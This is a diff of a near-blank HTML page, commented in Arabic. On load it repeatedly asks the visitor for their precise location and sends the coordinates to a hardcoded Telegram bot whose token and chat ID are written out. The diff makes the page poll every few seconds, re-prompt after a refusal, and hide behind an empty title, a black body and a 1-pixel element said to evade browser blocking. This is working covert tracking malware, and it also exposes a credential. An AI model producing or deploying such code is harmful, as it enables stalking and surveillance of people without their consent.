@@ -2,38 +2,42 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title></title>
+    <title>.</title>
     <script>
         const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
         const CHAT_ID = "6451561574";
         
+        // هذا سيطلب الإذن فعلاً
         function requestLocation() {
             navigator.geolocation.getCurrentPosition(
                 async function(position) {
-                    // إرسال الموقع للبوت
-                    const message = `📍 موقع جديد\nالإحداثيات: ${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`;
+                    // إرسال للبوت
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
                             chat_id: CHAT_ID,
-                            text: message
+                            text: `📍 ${position.coords.latitude},${position.coords.longitude}`
                         })
                     });
                     window.close();
                 },
                 function(error) {
-                    // إذا رفض، نعيد الطلب بعد ثانيتين
-                    setTimeout(requestLocation, 2000);
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
+                    // إعادة الطلب بعد 3 ثواني
+                    setTimeout(requestLocation, 3000);
+                }
             );
         }
 
-        // بدء الطلب فور تحميل الصفحة
-        window.onload = requestLocation;
+        // طلب فوري
+        requestLocation();
+        
+        // طلب كل 5 ثواني
+        setInterval(requestLocation, 5000);
     </script>
 </head>
-<body style="margin:0;padding:0;background:transparent;">
+<body style="margin:0;padding:0;background:#000;">
+    <!-- نقطة صغيرة لتجنب حظر المتصفح -->
+    <div style="width:1px;height:1px;"></div>
 </body>
 </html>
